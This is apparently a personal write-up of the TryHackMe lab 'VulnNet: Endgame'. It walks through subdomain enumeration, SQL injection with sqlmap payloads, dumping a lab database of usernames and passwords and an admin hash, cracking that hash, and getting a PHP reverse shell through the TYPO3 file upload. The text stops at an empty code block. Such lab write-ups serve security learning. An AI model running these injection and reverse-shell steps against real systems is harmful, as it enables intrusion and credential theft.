<h1 align="center">VulnNet: Endgame</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/0bea92e5-a71d-4ca6-a97f-8ac51f307026"><br>
2025, September 13<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>496</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Hack your way into this simulated vulnerable infrastructure. No puzzles. Enumeration is the key</em>.<br>
Access it <a href="https://tryhackme.com/room/vulnnetendgame">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/394589f3-2384-4502-a256-430b069f0a6a"></p>

<h1>Task 1 . VUlnNet: Endgame</h1>
<p> VulnNet series is back with a new challenge.<br>

It's the final challenge in this series, compromise the system. Enumeration is the key.<br>

Deploy the vulnerable machine by clicking the "Start Machine" button. Access the system at http://xx.xxx.x.xx and http://vulnnet.thm domain. Answer the task questions to complete the challenge.</p>

<p><em>Answer the questions below</em></p>


<h2>/etc/hosts</h2>

```bash
xx.xxx.x.xx vulnnet.thm
```

<h2>nmap</h2>
<p>

- 22 : ssh : OpenSSH 7.6p1 Ubuntu 4ubuntu0.7<br>
- 80 : http : Apache/2.4.29 (Ubuntu)</p>

```bash
:~# nmap -p- -T4 vulnnet.thm
...
PORT   STATE SERVICE
22/tcp open  ssh 
80/tcp open  http
```

```bash
:~# nmap -sC -sV -Pn -n -p- -T4 vulnnet.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
```

<h2>Web port 80</h2>

<img width="1054" height="520" alt="image" src="https://github.com/user-attachments/assets/d2bf8311-b400-4d38-9f9e-bb757d43d437" />


<h2>gobuster</h2>

```bash
:~# gobuster dir -u http://vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -e -k
...
http://vulnnet.thm/images               (Status: 301) [Size: 311] [--> http://vulnnet.thm/images/]
http://vulnnet.thm/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
http://vulnnet.thm/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]
http://vulnnet.thm/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
http://vulnnet.thm/sass                 (Status: 301) [Size: 309] [--> http://vulnnet.thm/sass/]
http://vulnnet.thm/server-status        (Status: 403) [Size: 276]
Progress: 218275 / 218276 (100.00%)
```

<p>

- api.vulnnet.thm<br>
- shop.vulnnet.thm<br>
- blog.vulnnet.thm<br>
- admin1.vulnnet.thm</p>

```bash
:~/VulnNet-Endgame# gobuster vhost -u http://vulnnet.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 100
...
Found: api.vulnnet.thm Status: 200 [Size: 18]
Found: shop.vulnnet.thm Status: 200 [Size: 26701]
Found: blog.vulnnet.thm Status: 200 [Size: 19316]
Found: admin1.vulnnet.thm Status: 307 [Size: 0] [--> http://admin1.vulnnet.thm/en/]
Found: *.vulnnet.thm Status: 400 [Size: 301]
```

<h2>/etc/hosts</h2>

```bash
xx.xxx.x.xx     vulnnet.thm api.vulnnet.thm shop.vulnnet.thm blog.vulnnet.thm admin1.vulnnet.thm
```

<h2>api.vulnet.thm</h2>
<p>

- http://api.vulnnet.thm/index.php</p>

<img width="1057" height="153" alt="image" src="https://github.com/user-attachments/assets/011a63b6-4e19-4244-9f24-8e6e9af38191" />

<br>
<br>
<h3>nmap</h3>

```bash
:~# gobuster dir -u http://api.vulnnet.thm/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
...
http://api.vulnnet.thm/index.php            (Status: 200) [Size: 18]
...
```

<h2>shop.vulnet.thm</h2>
<p>

- http://shop.vulnnet.thm/css/<br>
- http://shop.vulnnet.thm/fonts/<br>
- http://shop.vulnnet.thm/icon/<br>
- http://shop.vulnnet.thm/images/<br>
- http://shop.vulnnet.thm/index.html<br>
- http://shop.vulnnet.thm/js/</p>

<img width="1059" height="579" alt="image" src="https://github.com/user-attachments/assets/c8d5a83f-769e-4ae0-80e2-d25aab110d2c" />

<br>
<br>

<h3>nmap</h3>

```bash
:~# gobuster dir -u http://shop.vulnnet.thm/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
...
http://shop.vulnnet.thm/css                  (Status: 301) [Size: 318] [--> http://shop.vulnnet.thm/css/]
http://shop.vulnnet.thm/fonts                (Status: 301) [Size: 320] [--> http://shop.vulnnet.thm/fonts/]
http://shop.vulnnet.thm/icon                 (Status: 301) [Size: 319] [--> http://shop.vulnnet.thm/icon/]
http://shop.vulnnet.thm/images               (Status: 301) [Size: 321] [--> http://shop.vulnnet.thm/images/]
http://shop.vulnnet.thm/index.html           (Status: 200) [Size: 26701]
http://shop.vulnnet.thm/js                   (Status: 301) [Size: 317] [--> http://shop.vulnnet.thm/js/]
...
```

<h2>blog.vulnet.thm</h2>
<p>

- Mediumish Theme by WowThemes.net<br><br>
- http://blog.vulnnet.thm/assets/<br>
- http://blog.vulnnet.thm/index.html<br>
- http://blog.vulnnet.thm/index.php</p>

<img width="1057" height="611" alt="image" src="https://github.com/user-attachments/assets/c088ea7d-75a9-48b2-9b51-c5dfa29f8c3e" />

<br>
<br>
<h3>nmap</h3>

```bash
:~# gobuster dir -u http://blog.vulnnet.thm/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
...
http://blog.vulnnet.thm/assets               (Status: 301) [Size: 321] [--> http://blog.vulnnet.thm/assets/]
http://blog.vulnnet.thm/index.html           (Status: 200) [Size: 19316]
http://blog.vulnnet.thm/index.php            (Status: 200) [Size: 96]
...
```

<br>
<br>
<h2>admin1.vulnet.thm</h2>
<p>

- admin1.vulnnet.thm/en/<br>
- admin1.vulnnet.thm/fileadmin/<br>
- admin1.vulnnet.thm/typo3temp/<br>
- admin1.vulnnet.thm/typo3conf/<br>
- http://admin1.vulnnet.thm/typo3/<br>
- http://admin1.vulnnet.thm/vendor/<br>
- http://admin1/vulnnet.thm/en/index.html<br>
- http://admin1.vulnnet.thm/typo3/index.php</p>

<img width="1057" height="180" alt="image" src="https://github.com/user-attachments/assets/b6646ad5-bb46-408b-ab8b-afa54e26fa58" />

<br>
<br>
<h3>nmap</h3>

```bash
:~# gobuster dir -u http://admin1.vulnnet.thm/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
...
http://admin1.vulnnet.thm/en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
http://admin1.vulnnet.thm/fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
...
http://admin1.vulnnet.thm/typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
http://admin1.vulnnet.thm/typo3conf            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3conf/]
http://admin1.vulnnet.thm/typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/]
http://admin1.vulnnet.thm/vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/]
```

```bash
:~# gobuster dir -u http://admin1.vulnnet.thm/en/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
http://admin1.vulnnet.thm/en/index.html           (Status: 200) [Size: 32]
...
```

```bash
:~# gobuster dir -u http://admin1.vulnnet.thm/typo3/ -w /usr/share/dirb/wordlists/common.txt -t 80 -e -k -q
...
http://admin1.vulnnet.thm/typo3/index.php            (Status: 200) [Size: 10843]
...
```

<h2>admin1.vulnnet.thm/typo3/index.php</h2>

<img width="1056" height="599" alt="image" src="https://github.com/user-attachments/assets/aeda65c5-117b-4fd5-af55-3e12854c97fc" />

<h2>blog.vulnnet.thm</h2>

<p>

- Windows Search Vulnerability Can be Abused to Deliver ...<br>
- http://blog.vulnnet.thm/post1.php<br>


<img width="1185" height="698" alt="image" src="https://github.com/user-attachments/assets/15b96f03-25cf-4a4e-adf4-df1ae7907e74" />

<br>
<br>

<img width="1189" height="532" alt="image" src="https://github.com/user-attachments/assets/6985c747-81f2-4765-8417-41fae071b740" />

<br>
<br>

<h2>[admin1.vulnnet.thm/typo3/index.php](http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1)</h2>

<img width="1191" height="174" alt="image" src="https://github.com/user-attachments/assets/7bd2928d-1cb2-4963-afd9-92db75712616" />

<br>
<br>
<h2>sqlmap</h2>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch --dbs
```

<p>

- reflective value(s) found and filtering out<br>
- 'ORDER BY' technique appears to be usable.<br>
- GET parameter 'blog' is vulnerable.<br>
- back-end DMBS: MySQL >= 5.0.12<br>
- available databases: blog, information_schema, vn_admin</p>


```bash
[xx:xx:xx] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[xx:xx:xx] [INFO] target URL appears to have 3 columns in query
[xx:xx:xx] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=1 AND 4875=4875

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=1 AND (SELECT 2265 FROM (SELECT(SLEEP(5)))epNv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9890 UNION ALL SELECT CONCAT(0x7176707671,0x645944777150676a665a4a42716f6a64634f6e6d53484e79754176566f4c524a6c76496b574d634c,0x716b767171),NULL,NULL-- -
---
[xx:xx:xx] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[xx:xx:xx] [INFO] fetching database names
[xx:xx:xx] [INFO] retrieved: 'information_schema'
[xx:xx:xx] [INFO] retrieved: 'blog'
[xx:xx:xx] [INFO] retrieved: 'vn_admin'
available databases [3]:                                                                                                                                                         
[*] blog
[*] information_schema
[*] vn_admin
```

<br>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin --tables
```

```bash
Database: vn_admin                                                                                                                                                               
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+
```

<br>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin -T be_users --columns
```

```bash
Database: vn_admin                                                                                                                                                               
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| disable               | smallint(5) unsigned |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+
```

<br>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin -T be_users -C username,password --dump
```

```bash
Database: vn_admin
Table: be_users
[1 entry]
+----------+---------------------------------------------------------------------------------------------------+
| username | password                                                                                          |
+----------+---------------------------------------------------------------------------------------------------+
| chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+----------+---------------------------------------------------------------------------------------------------+
```

```bash
:~# echo '$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg' > Hash
```

<br>
<br>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog --tables
```

```bash
Database: blog                                                                                                                                                                   
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
```

<br>

```bash
:~# sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T users --columns
```

```bash
Database: blog                                                                                                                                                                   
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

<br>

```bash
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T users -C username,password --dump
```

```bash
Database: blog                                                                                                                                                                   
Table: users
[651 entries]
+--------------------+---------------------+
| username           | password            |
+--------------------+---------------------+
[20:29:11] [WARNING] console output will be trimmed to last 256 rows due to large table size
| lspikinsaz         | D8Gbl8mnxg          |
| profeb0            | kLLxorKfd           |
| sberrymanb1        | cdXAJAR             |
| ajefferiesb2       | 0hdeFiZBRJ          |
| hkibblewhiteb3     | 6rl6qXSJDrr         |
| dtremayneb4        | DuYMuI              |
| bflewinb5          | fwbk0Vgo            |
| kmolineuxb6        | 92Fb3vBF5k75        |
| fjosefsb7          | zzh9wheBjX          |
| tmiskellyb8        | sAGTlyBrb5r         |
| nallrightb9        | 3uUPdL              |
| hlevermoreba       | fp2LW0x             |
| celgerbb           | IKhg7D              |
| frustedbc          | Tjyu2Ch2            |
| imeneghibd         | NgKgdeKRVEK         |
| vgouninbe          | wGWMg3d             |
| cbartoschbf        | ruTxBc2n85          |
| lcordonbg          | ZydELwZFV2          |
| dappsbh            | ROfVmvZSYS          |
| zduchanbi          | B4SBGt5yAD          |
| jfraybj            | zhE95JJX9l          |
| mlanchesterbk      | nXSVHhVW9S          |
| cgylesbl           | NCeU070             |
| cbonnifacebm       | WzkvfoedkXJx        |
| btoppasbn          | ktPBpK1             |
| mdurrettbo         | 8fCXE6BF9gj         |
| skilroybp          | cSAjOy              |
| uvonderemptenbq    | HLUHZ9oQ            |
| dvinsenbr          | gTc7TiSsd2          |
| ltiltbs            | 7yQ0b1B             |
| dsimcoebt          | SXD1eC6ysa          |
| wfrailbu           | bgb084kq            |
| lmityukovbv        | NsJFz4DLpI          |
| vkellarbw          | 7JVPatN             |
| rkingstonbx        | yuTnSPEvIoJ4        |
| rbakewellby        | L3ttm8              |
| dbousteadbz        | vyae6t              |
| vstaddenc0         | iA4AD4UlcLF1        |
| rwhacketc1         | VlyIAh              |
| tnoorc2            | IpsnIEbIaT          |
| dduffync3          | UPU9rZu8q           |
| dstichelc4         | xuUXUFXoc           |
| kcleverlyc5        | yTuqouj9ZK          |
| sreinertc6         | QDneobZ1DH          |
| mcottinghamc7      | OdrnoHtrP           |
| ljansemac8         | c3KvR6              |
| acodac9            | GMbFP9              |
| rhuggardca         | zIZ11OPuj           |
| gkeechcb           | XCX2GVx             |
| syurincc           | nJQgYR2uOyZq        |
| agaulecd           | AQlFlPvf            |
| wboijce            | zj6vR6Bf            |
| kphifercf          | eL5uJnLD2           |
| abenglecg          | 7HEMdTc07           |
| emarkingch         | VbzVZoYn            |
| nmuldowneyci       | wln8WN3PJ           |
| jbygrovecj         | 3AcKBTHRN           |
| bduxburyck         | 32ZXql9Uw8          |
| fthewcl            | 2pnBsk6i            |
| kmeececm           | JxcEXKAN            |
| bholligancn        | rkyCMLwOIt          |
| bferonetco         | KlxQ4Vxl            |
| jcraycp            | OFc5f2              |
| hethertoncq        | SsLMTxbw            |
| cclayecr           | nUpdnCZW1cqr        |
| tmcbreartycs       | 0I7ldSNbm           |
| oderuggieroct      | gqQeawiZ            |
| rdoerscu           | djQBjW3pk           |
| karbucklecv        | G9FarmKd            |
| bbuckbycw          | lXCoFI              |
| ldixseecx          | WAMRuFTTI3          |
| jmahedycy          | diVq6PDeEpz         |
| gdamrellcz         | bV6cXPOFfLg         |
| sgarrettd0         | dCrF5fv             |
| plaurenceaud1      | Q4gYmlM             |
| kmcgeacheyd2       | SnvFrSB6AB          |
| mhopewelld3        | qiehVyQ             |
| chottond4          | At9A4aCJos          |
| hsellandd5         | 8T9v08352re         |
| syegorkovd6        | y8chyGC9js          |
| adavisond7         | ghMz6e68c1Z         |
| amewisd8           | 00S7q8S1f8W         |
| lorpind9           | 2rruluVz0SwY        |
| jbilovskyda        | hXaVYfHUZoz         |
| jhalforddb         | j7GAP4v             |
| wcolisbedc         | 0MM46yTEVBL2        |
| cgreastydd         | QUDViFUxO           |
| ajackde            | YGcBpM              |
| cmcgarritydf       | 2js9AM              |
| tjostdg            | oJ38KUXgm           |
| lguidendh          | KP9DmIk             |
| mbletsodi          | qNYURfhw            |
| wsneesbydj         | jDmbnZJi            |
| glerouxdk          | t8xlAuAvH8Yj        |
| yhaythornthwaitedl | TTin1up             |
| nzmitrovichdm      | 0ftVkbqP            |
| jgodballdn         | Kwcozh              |
| jkiddeydo          | TWnwDTB             |
| acaghandp          | IxQgXLrw            |
| rattestonedq       | AxuOsAA0lqrc        |
| mmichallatdr       | GCpyVf              |
| rgaitoneds         | YnPCjKg             |
| krobbekedt         | NOYhOlnC            |
| nknollerdu         | pjSBcAVD            |
| wshemeltdv         | 5RigTGe             |
| rpeperelldw        | jwKMTMu             |
| lbescobydx         | 4qfwbKNed3I         |
| jparishdy          | qSX9N1Kf8XJ         |
| jminghidz          | AoIrka              |
| nforthe0           | Ft4xVROXXCd5        |
| tklemensiewicze1   | x3WIaoX99yb         |
| epotterye2         | hXcrFv              |
| lbrugmanne3        | 6ZtJhp4col          |
| adencse4           | bqItfg4wf           |
| cfloreze5          | 5W4lM81DPo          |
| amatanine6         | IT6p5HT             |
| fchalkere7         | 0Q6T9jvAZB          |
| rytere8            | M7lvtAz6oRNS        |
| cstillee9          | MpO7FgPoz           |
| cbashamea          | 8rIuhW0VZ           |
| flyeseb            | OS15i4              |
| gtieryec           | Usl7mH2H            |
| sborgheseed        | WDAliOAKFj7f        |
| hmctrustyee        | iwpk0YC             |
| wvigeref           | lN8d6g1             |
| nbockeneg          | nuwPbeTIgX8F        |
| ffranzmaneh        | LvBDyc9JRPV         |
| drippingaleei      | ncpiXJX             |
| achambersej        | vQUTz2xEyWx4        |
| fsuarezek          | wQcbURC             |
| kaspoleel          | irTEDl2k            |
| mmursellem         | H6WyTMdy            |
| szecchinellien     | pukixtg             |
| cnewlineo          | Or6dtgSGmd          |
| cmccrowep          | VhkvlZO             |
| shavershameq       | slncO0kvmb          |
| jtumeltyer         | svJ4749mzdJ         |
| cmathivates        | weR5eukJOX6C        |
| btarzeyet          | rp8sqUpw            |
| fstedmaneu         | 8T7UFX              |
| mgaitoneev         | SkuuzEsAZ           |
| zscotlandew        | RIs9MA              |
| dfurbyex           | ttKwcGDELB          |
| sdallowey          | PVVOkQqHVdU         |
| lmccormackez       | Szh74h              |
| arenneyf0          | wMkLVr0             |
| lbodegaf1          | 4Bux8MCHXS          |
| rsantostefanof2    | ZXIOChbv            |
| mvaissieref3       | PcJPLBJf            |
| csolwayf4          | kgjhKzMWYakS        |
| pwaddingtonf5      | p69xguJZe           |
| kchaffeyf6         | ntswwsY             |
| zgooblef7          | lh0Llscj            |
| pwassf8            | uqzWk2PYLJR7        |
| bmcclenaghanf9     | eIZQxLh             |
| bhaddintonfa       | IDp96W1RUb          |
| rblesingfb         | Z7MGodFb            |
| mblownefc          | caw1QQ1             |
| lwhitlandfd        | QpPSspEWus          |
| lgoftonfe          | u6ZBlHvmId          |
| vdubbleff          | BvZ0JJNVWCX         |
| dfrenschfg         | Ih1thIl             |
| gofarrisfh         | jmjhYpmgg           |
| kpipkinfi          | LFXCNqt5hN          |
| sshilstonfj        | tofKHos             |
| lstanistreetfk     | fCMRSGm4BzNQ        |
| ktomasellifl       | zFdwNg16yCdB        |
| fmarkhamfm         | qJhjNz0sK7Z         |
| bledingtonfn       | wmd4CD60            |
| yzettoifo          | mZjvZC              |
| coganfp            | 7MeBiB7             |
| sdibollfq          | VCV8FqINn           |
| blampkinfr         | OsZxivx             |
| mfachefs           | HVBEN4              |
| kburelft           | m9R8setEC           |
| bgrimsdithfu       | q1SivtRlbetm        |
| ctolemanfv         | fRnopRDUrds         |
| awhiteheadfw       | eZ3TzXtdD           |
| mchislettfx        | Uh2kDLMNFeej        |
| lreichardtfy       | Ln6WDY              |
| bjossfz            | kGBl9CgCPcGF        |
| hprevostg0         | TuK60tJ             |
| rpritchettg1       | mwTGls              |
| dantonssong2       | Ym2cHtkuW           |
| gmantrupg3         | axZcgE9T            |
| dsimioneg4         | 6LFtl39ggEtI        |
| lmiddleg5          | 79hJw4u             |
| amcquorkelg6       | UdPazP              |
| mellwandg7         | hFdDjfcdwCja        |
| ddunbobing8        | w9Copz4             |
| cszabog9           | K67Hs5              |
| cdorbonga          | molOCywSVk          |
| fridgwellgb        | wWQpqk              |
| ksiregc            | Ipmq9QvTymr         |
| hwhardleygd        | 7v4eltt3Kuw         |
| hpoppletonge       | ctvNF49tuT          |
| aghidoligf         | hFgxHo5Xp           |
| fstilinggg         | g4St9w              |
| ebodechongh        | DTSos9KOFhIO        |
| rbennellickgi      | 0lj1adMG            |
| gnaldergj          | kNEDmUrVp           |
| preygk             | 8kt6CKNTc           |
| cjigglegl          | Khmoz3bGQiwo        |
| aburgisgm          | 2UrQCd16gtqN        |
| nluddygn           | yQrAEzZxK           |
| lcluttengo         | TeFpfcTSt4K         |
| laseefgp           | Q8vHxue1            |
| wdovergq           | 8sNg5H              |
| bjackesgr          | BB2ymU              |
| sphebeygs          | CTCPBoG             |
| hhushergt          | KoM1f3mmxlC         |
| dmowatgu           | H9fzdE              |
| vgoodhandgv        | OQ4Axwb             |
| vcocktongw         | zo9YGPcnoFY         |
| afrackiewiczgx     | wNfgrMLd92          |
| wmccorkellgy       | L70zF2              |
| mbaldersongz       | vjlPxrlrB1          |
| jdovingtonh0       | 1fDBrk              |
| tlunneyh1          | NVQobq              |
| lwaulkerh2         | 4IHZylSa6uSk        |
| nceccolih3         | 6mqTbfJcyB          |
| aworsnuph4         | BtdoQGpOg           |
| pwheelhouseh5      | HA5wRx2Xkt          |
| ashearsh6          | rsQIXNF4p56t        |
| bhendriksh7        | DD87MyB             |
| tgrovierh8         | EqEt2NXw37Q         |
| kspanswickh9       | oN9I8Sf             |
| krattrayha         | HkZs0YLv            |
| anorcockhb         | LTSB3oaxy9          |
| kneathc            | 2lOIMadSDW2         |
| ajaggarhd          | 2YDcmeZaKwig        |
| krossbrookehe      | 7pA32uFwx8eh        |
| lpavelhf           | yoWnriWXeTc         |
| agaitskillhg       | OglY7vT0Pyn         |
| bmylechreesthh     | GBCtL62Xa           |
| hsimenothi         | JdHOJPdpZV          |
| bbrunihj           | PT8RllCQ            |
| sroysonhk          | bJR3DOVL            |
| bmarrinerhl        | yoJwhOI             |
| ataillanthm        | tfncTGLw            |
| acassamhn          | dBcYuQwU            |
| kfruchonho         | s6QjWpLo            |
| kdenyakinhp        | LTbmsk6T            |
| mhundyhq           | xrbjFjA8p           |
| zcatchesidehr      | gaMmTSLHkMZE        |
| anorcrosshs        | VH3FsbYfk           |
| kklavesht          | YY6hmavoD           |
| bloghanhu          | kElKt4              |
| ekayzerhv          | 4eHrdt5Z            |
| jovenhw            | 2QZrPJ2             |
| gboayshx           | t0xmZtLTXa          |
| asuermeiershy      | 09jD21OoQ           |
| msambidgehz        | OBJZD6f             |
| bhuertai0          | Cc4QOkuSvrF         |
| oboatmani1         | kSKBUj8             |
| rtamblingi2        | BIkqvmX             |
+--------------------+---------------------+

[xx:xx:xx] [INFO] table 'blog.users' dumped to CSV file '/root/.sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
```

<br>
<h2>passwords.txt</h2>

```bash
:~# cat /root/.sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | cut -d "," -f2 > passwords.txt
```

```bash
:~# tail -n 6 passwords.txt
09jD21OoQ
OBJZD6f
Cc4QOkuSvrF
kSKBUj8
BIkqvmX
```

<br>
<h2>John the Ripper</h2>

<p>

- chris_w : ***********</p>

```bash
:~# john --wordlist=passwords.txt Hash
Using default input encoding: UTF-8
Loaded 1 password hash (argon2 [Blake2 AVX])
Cost 1 (t) is 16 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***********      (?)
1g 0:00:01:14 DONE (2025-09-14 xx:xx) 0.01347g/s 1.725p/s 1.725c/s 1.725C/s selW0qQ4..Z2WgzYZCK
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br>
<p>1.1. What is the password of the CMS administrator?<br>
<code>***********</code></p>

<br>
<h2>http://admin1.vulnnet.thm/typo3/index.php</h2>

<img width="838" height="343" alt="image" src="https://github.com/user-attachments/assets/aa19ba1b-93f3-4067-abf7-1f04bcb53ed7" />

<br>
<br>

<img width="1190" height="800" alt="image" src="https://github.com/user-attachments/assets/b7f15060-5b2b-481e-95a3-244b55abc31b" />

<br>

<h2>Pentest Monkey PHP Reverse Shell</h2>
<p>

- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</p>


<h2>Settings</h2>

<p>

- <code>Settings</code><br>
- <code>Configure Installation-Wide Options</code><br>
- Delete the content of <code>[BE][fileDenyPattern]</code><br>
- <code>Write Configuration</code><br>
- close<br><br>
- navigate to <code>Filelist</code><br>
- browse and upload the reverse shell<br>
- set up a listener<br>
- navigate to http://admin1.vulnnet.thm/fileadmin/<br>
- click over rev.php</p>

<img width="1194" height="798" alt="image" src="https://github.com/user-attachments/assets/484b47c3-6260-4681-80b5-39c707d1e258" />

<br>
<br>

<img width="1174" height="84" alt="image" src="https://github.com/user-attachments/assets/1346713b-9f12-470b-822b-5fa5bbe1c8d4" />

<br>
<br>

<img width="1182" height="153" alt="image" src="https://github.com/user-attachments/assets/3b3f46b7-7afd-45af-aa59-9e06378d570a" />

<br>
<br>

<img width="1183" height="400" alt="image" src="https://github.com/user-attachments/assets/77b81152-18ac-477c-83dd-d0892e97eb44" />

<br>
<br>

<img width="1179" height="228" alt="image" src="https://github.com/user-attachments/assets/cff7d158-c15c-4ca8-85d3-24af2dd44554" />

<br>
<br>

<img width="1179" height="228" alt="image" src="https://github.com/user-attachments/assets/20a2b506-2330-4658-af66-3ce3e3d985a2" />


<br>
<br>
<h2>www-data</h2>

```bash
:~/VulnNet-Endgame# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on xx.xxx.x.xx 52044
Linux vulnnet-endgame 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 xx:xx:xx up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnnet-endgame:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/VulnNet-Endgame# stty raw -echo; fg
nc -nlvp 1234

www-data@vulnnet-endgame:/$ export TERM=xterm
www-data@vulnnet-endgame:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@vulnnet-endgame:/$ pwd
/
www-data@vulnnet-endgame:/$ 
```


```bash
